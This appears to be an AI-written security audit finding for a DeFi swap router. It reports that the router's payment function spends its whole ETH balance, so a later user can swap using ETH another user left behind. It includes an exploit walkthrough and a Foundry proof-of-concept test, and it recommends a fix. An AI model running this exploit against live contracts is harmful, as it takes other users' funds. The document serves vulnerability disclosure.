I have all the code I need. Let me analyze the `pay` function carefully.

The vulnerability is real. Here is the full analysis:

---

### Title
Stranded Router ETH Consumed by Arbitrary Subsequent WETH Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay` uses `address(this).balance` — the router's **total** native ETH balance — when deciding how much ETH to wrap into WETH for a swap. It does not track which caller's `msg.value` is currently in flight. Any ETH left on the router from a prior transaction (because the user sent more than `amountIn` and omitted `refundETH`) is silently consumed to fund the next caller's WETH payment, with zero ETH or WETH pulled from that next caller.

---

### Finding Description

`pay` in `PeripheryPayments.sol` lines 73–84:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← total router ETH, not msg.value
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`nativeBalance` is `address(this).balance`, which accumulates across transactions. The `receive()` guard only blocks direct ETH pushes from non-WETH addresses: [2](#0-1) 

It does **not** block ETH arriving as `msg.value` in any `payable` entry point (`exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`, `multicall`). ETH sent via `msg.value` bypasses `receive()` entirely and lands directly in `address(this).balance`.

**Stranding path (no attacker action needed for setup):**

Alice calls `exactOutputSingle{value: 2 ether}(amountOut: Y, amountInMaximum: 2 ether, tokenIn: WETH)` directly (not via multicall). The pool charges 1 ether of actual input. The `pay` call wraps 1 ether; 1 ether remains on the router. Alice does not call `refundETH` (she called the function directly, not via multicall). The 1 ether is now permanently stranded until someone else's swap consumes it. [3](#0-2) 

**Exploit path:**

Bob calls `exactInputSingle{value: 0}(amountIn: 1 ether, tokenIn: WETH)`. In `_justPayCallback`: [4](#0-3) 

`pay(WETH, Bob, pool, 1 ether)` is called. `nativeBalance = 1 ether >= value = 1 ether`, so the first branch fires: Alice's stranded ETH is wrapped and transferred to the pool. Bob's `safeTransferFrom` is never reached. Bob receives the full swap output at zero cost. Alice's 1 ether is gone.

The partial-native branch (lines 78–81) is equally exploitable: if the stranded amount is less than `value`, it reduces the pull from Bob's address by exactly the stranded amount — Alice subsidizes part of Bob's swap. [5](#0-4) 

---

### Impact Explanation

Direct loss of user principal. Alice's ETH is consumed to fund Bob's swap. Bob receives swap output without paying. The invariant that only the current caller's `msg.value` funds WETH wrapping is violated. Impact is **High**: victim loses 100% of stranded ETH, attacker gains equivalent swap output for free.

---

### Likelihood Explanation

**Medium.** ETH stranding requires a user to call a payable swap function directly (not via multicall) with `msg.value > amountIn`, and omit `refundETH`. This is a realistic mistake: `exactOutputSingle` is a standalone `payable` function, users routinely overshoot `msg.value` for slippage headroom, and the function provides no automatic refund. Once stranded, the exploit requires only a single public call with `msg.value = 0` and `tokenIn = WETH`.

---

### Recommendation

Track only the current transaction's contributed ETH. The standard fix is to record `msg.value` at entry and use that as the cap for native wrapping, rather than `address(this).balance`. Alternatively, add an automatic `refundETH` at the end of every payable swap entry point so no ETH can survive past a single transaction.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudocode referencing real contracts)
function test_strandedEthStealing() public {
    uint128 amountIn = 1_000;
    uint256 aliceOverpay = 2_000; // Alice sends 2x the needed ETH

    // Step 1: Alice calls exactOutputSingle directly (no multicall, no refundETH)
    // She overpays by 1_000 native ETH; actual amountIn = 1_000, leaving 1_000 stranded.
    vm.prank(alice);
    router.exactOutputSingle{value: aliceOverpay}(
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: someOutput,
            amountInMaximum: uint128(aliceOverpay),
            recipient: alice,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // Router now holds 1_000 wei of Alice's ETH (stranded)
    assertEq(address(router).balance, 1_000);

    // Step 2: Bob swaps with msg.value = 0, consuming Alice's stranded ETH
    uint256 bobWethBefore = weth.balanceOf(bob);
    uint256 bobToken1Before = token1.balanceOf(recipient);

    vm.prank(bob);
    router.exactInputSingle{value: 0}(   // ← zero ETH sent by Bob
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1_000,
            amountOutMinimum: 0,
            recipient: recipient,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Bob received swap output, paid nothing (neither ETH nor WETH)
    assertEq(weth.balanceOf(bob), bobWethBefore, "Bob paid no WETH");
    assertEq(address(router).balance, 0, "Alice's ETH consumed");
    assertGt(token1.balanceOf(recipient), bobToken1Before, "Bob got output");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
